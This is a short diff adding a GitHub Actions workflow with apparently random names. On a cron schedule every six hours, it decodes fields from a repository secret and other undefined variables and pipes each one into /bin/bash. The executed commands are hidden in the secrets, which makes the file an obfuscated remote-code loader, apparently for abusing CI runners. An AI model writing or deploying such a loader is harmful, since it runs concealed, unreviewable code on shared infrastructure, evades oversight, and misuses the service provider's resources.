@@ -1,0 +1,19 @@
+name: wanghuangzi4536
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanghuangzi4536
+        env:
+          utlb7: ${{ secrets.utlb7 }}
+        run: |
+          echo $utlb7 | jq -r .oynx08966 | /bin/bash
+          echo $ccfp1033 | jq -r .d79205 | /bin/bash
+          echo $awft88711 | jq -r .cnxn46 | /bin/bash
+          echo $xuakh0346 | jq -r .a23 | /bin/bash
+
